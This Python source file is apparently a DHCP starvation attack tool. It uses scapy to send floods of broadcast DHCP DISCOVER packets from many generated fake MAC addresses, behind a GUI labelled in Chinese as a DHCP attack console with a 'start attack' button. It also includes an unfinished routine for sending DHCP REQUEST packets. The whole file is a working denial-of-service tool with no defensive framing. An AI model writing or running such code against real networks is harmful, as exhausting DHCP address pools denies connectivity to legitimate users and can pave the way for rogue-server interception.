from scapy.all import *
from scapy.layers.l2 import Ether
import binascii
import netifaces
from queue import Queue
import PySimpleGUI as sg
import platform

DISCOVER_THREADS_NUM = 10
REQUEST_THREADS_NUM = 10

dhcp_offer_queue = Queue()
mac_ip_queue = Queue()


class DhcpDiscoverThread(threading.Thread):
    packet_count = 0
    @staticmethod
    def get_interfaces():
        interfaces = netifaces.interfaces()
        valid_if = []
        for ifname in interfaces:
            if ifname == 'lo' or ifname.startswith('lo'):
                continue
            if netifaces.AF_INET in netifaces.ifaddresses(ifname):
                valid_if.append(ifname)
        default_if = 'en0' if platform.system() == 'Darwin' else 'eth0'
        return valid_if or [default_if]

    def __init__(self, mac, iface, speed):
        super().__init__()
        self.mac = mac
        self.iface = iface
        self.speed = speed
        self.running = True

    def run(self):
        xid = random.randint(0, 0xFFFFFFFF)
        srcmac = binascii.a2b_hex(self.mac.replace(":", ""))
        options = binascii.a2b_hex("63825363")
        discover_pkt = Ether(dst="FF:FF:FF:FF:FF:FF", src=srcmac) \
                       / scapy.all.IP(tos=None, len=None, id=1, flags="", frag=0, ttl=64, proto=17, chksum=None,
                                      src="0.0.0.0", dst="255.255.255.255") \
                       / scapy.all.UDP(sport=68, dport=67, len=None, chksum=None) \
                       / scapy.all.BOOTP(op=1, xid=xid, htype=1, hlen=6, hops=0, secs=0, flags="B", ciaddr="0.0.0.0",
                                         yiaddr="0.0.0.0", siaddr="0.0.0.0", giaddr="0.0.0.0", chaddr=srcmac, sname="",
                                         file="", options=options) \
                       / scapy.all.DHCP(
            options=[("message-type", "discover"), ("client_id", b"\x01" + srcmac), ("requested_addr", "192.168.1.6"),
                     ("hostname", "chahong"), ("vendor_class_id", 'MSFT 5.0'),
                     ("param_req_list", [1, 3, 6, 15, 31, 33, 43, 44, 46, 47, 119, 121, 249, 252]), "end"])

        while self.running:
            sendp(discover_pkt, iface=self.iface, verbose=False)
            self.packet_count += 1
            mac_ip_queue.put(('STATS', self.mac, self.packet_count))
            time.sleep(self.speed)

class DhcpRequestThread(threading.Thread):
    def __init__(self, mac):
        super().__init__()
        self.requestip = mac[0]
        self.dhcpserver = mac[1]
        self.xid = mac[2]
        self.srcmac = mac[3]

    def run(self):
        src_mac = ":".join([binascii.hexlify(self.srcmac[i:i + 1]).decode() for i in
                            range(0, 6)])
        options = binascii.a2b_hex("63825363")
        srcmac = binascii.a2b_hex(src_mac.replace(":", ""))
        pkt_dhcp_quest = Ether(dst="FF:FF:FF:FF:FF:FF", src=src_mac) \
                         / scapy.all.IP(tos=None, len=None, id=1, flags="", frag=0, ttl=64, proto=17, chksum=None,
                                        src="0.0.0.0", dst="255.255.255.255") \
                         / scapy.all.UDP(sport=68, dport=67, len=None, chksum=None) \
                         / scapy.all.BOOTP(op=1, htype=1, hlen=6, hops=0, xid=self.xid, secs=0, flags="B",
                                           ciaddr="0.0.0.0", yiaddr="0.0.0.0", siaddr="0.0.0.0", giaddr="0.0.0.0",
                                           chaddr=self.srcmac, sname="", file="", options=options) \
                         / scapy.all.DHCP(
            options=[("message-type", "request"), ("client_id", b"\x01" + srcmac), ("requested_addr", self.requestip),
                     ("server_id", self.dhcpserver), ("hostname", b'DESKTOP-7716SI9'), ("vendor_class_id", b'MSFT 5.0'),
                     ("param_req_list", [1, 3, 6, 15, 31, 33, 43, 44, 46, 47, 119, 121, 249, 252]), "end"])
        iface = DhcpDiscoverThread.get_interfaces(None)
        sendp(pkt_dhcp_quest, iface=iface, verbose=False)


def start_dhcp_discover_threads(mac_addresses, iface, speed):
    threads = []
    for mac in mac_addresses:
        thread = DhcpDiscoverThread(mac, iface, speed)
        thread.start()
        threads.append(thread)
    return threads

def create_gui():
    interfaces = DhcpDiscoverThread.get_interfaces()
    layout = [
        [sg.Text('线程数:'), sg.Input('50', size=(5,1), key='-THREADS-')],
        [sg.Text('网卡接口:'), sg.Combo(interfaces, default_value=interfaces[0] if interfaces else '', key='-IFACE-')],
        [sg.Text('发送速度'), sg.Slider((0.1, 2.0), default_value=0.5, resolution=0.1, orientation='h', key='-SPEED-')],
        [sg.Button('开始攻击'), sg.Button('停止'), sg.Exit()],
        [sg.Text('攻击状态：', size=(10,1)), sg.Text('未启动', key='-STATUS-', text_color='red')],
        [sg.Output(size=(100,25), expand_x=True, expand_y=True)]
    ]
    return sg.Window('DHCP攻击控制台', layout, finalize=True, size=(1000, 600), resizable=True)

if __name__ == "__main__":
    window = create_gui()
    attack_active = False

    while True:
        event, values = window.read(timeout=100)
        if event in (sg.WIN_CLOSED, 'Exit'):
            break

        if event == '开始攻击':
            attack_active = True
            mac_addresses = []
            thread_count = int(values['-THREADS-'])
            for i in range(thread_count):
                mac_address = "{:012x}".format(int("000002000001", 16) + 1 * i)
                mac_address = re.sub("(.{2})", "\\1:", mac_address, 0)[:-1]
                mac_addresses.append(mac_address)
            global threads
            threads = start_dhcp_discover_threads(mac_addresses, values['-IFACE-'], values['-SPEED-'])

        if event == '停止':
            attack_active = False
            for t in threads:
                t.running = False
            threads = []
            window['-STATUS-'].update('已停止', text_color='red')
            window['-THREADS-'].update(disabled=False)
        if attack_active:
            window['-STATUS-'].update('攻击中', text_color='green')


    window.close()